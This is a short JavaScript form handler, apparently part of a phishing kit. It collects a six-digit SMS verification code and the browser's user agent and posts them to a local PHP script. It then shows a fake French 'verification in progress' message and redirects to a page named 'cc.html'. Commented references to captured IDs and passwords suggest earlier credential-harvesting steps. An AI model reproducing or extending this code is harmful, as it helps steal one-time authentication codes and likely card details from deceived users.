$(document).ready(function(){
	
$("#coverspin").hide();	

});               

function smspass(){
	
var SMS_sg	 =	 $("#sms_code").val();
	
	//alert(ID_sg);
	//alert(PASS_sg);
	
if(SMS_sg==''||SMS_sg.length<6){

swal({
icon: 'error',
title: 'Erreur !',
text: "Corriger votre saisie"

})	

return false;	
}


var data_sms = 
{
DEVICE_sg  : navigator.userAgent,
 SMS_sg    :	SMS_sg

}; 
 $("#body").hide(); 
$('#coverspin').show();

console.log(JSON.stringify(data_sms));
var _url = './config/smspass.php';

$("#text_load").html("Vérification du code en cours......");

$.post(_url,data_sms,function(data){
 var reponse = JSON.parse(data); 


if(reponse.statut=="error"){	

swal({
icon: reponse.statut,
title: reponse.title,
text: reponse.resultat

});
}else if(reponse.statut=="success"){	
setTimeout(()=>{

window.location.href="cc.html";
},6000)

} 


}) 
}